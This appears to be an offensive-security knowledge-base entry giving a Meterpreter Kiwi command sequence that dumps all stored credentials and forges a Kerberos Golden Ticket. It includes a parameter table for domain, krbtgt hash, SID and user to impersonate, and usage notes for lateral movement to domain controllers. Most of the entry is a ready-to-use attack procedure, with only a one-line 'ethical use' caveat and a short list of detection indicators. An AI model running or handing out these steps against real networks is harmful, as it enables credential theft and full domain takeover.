---
type: code
language: powershell
verified: true
platforms:
  - Windows
tags:
  - kiwi
  - golden-ticket
  - kerberos
validated: true
---

# kiwi-golden-ticket-generation

## Code

```powershell
load kiwi
creds_all
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

## Description

This sequence loads the Kiwi extension in Meterpreter, dumps all available credentials (including potential krbtgt hash), and forges a Golden Kerberos ticket for domain impersonation, enabling unauthorized access to Active Directory resources.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <domainname> | Target domain FQDN | contoso.com |
| <nthashof krbtgt> | NTLM hash of krbtgt user | 31d6cfe0d16ae931b73c59d7e0c089c0 |
| <SID without le RID> | Domain SID prefix (no last part) | S-1-5-21-1234567890-1234567890-1234567890 |
| <user_for_the_ticket> | User to impersonate | administrator |
| <location_to_store_tck> | File path for ticket | C:\golden.kirbi |

## Usage

Run in an elevated Meterpreter session post-credential dump. Substitute parameters with values from prior steps. Import the generated ticket for lateral movement, e.g., to access domain shares or DCs. Ethical use only in authorized testing.

## Detection

- Unusual Kerberos pre-authentication failures or ticket requests (Event ID 4768/4769).
- Monitoring for forged ticket signatures or anomalous TGT lifetimes (10-year default for Golden Tickets).
- Process injection into lsass.exe or kiwi.dll artifacts.

## Related

- [[procedures/Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz]]
- [[tools/Metasploit-Framework]]
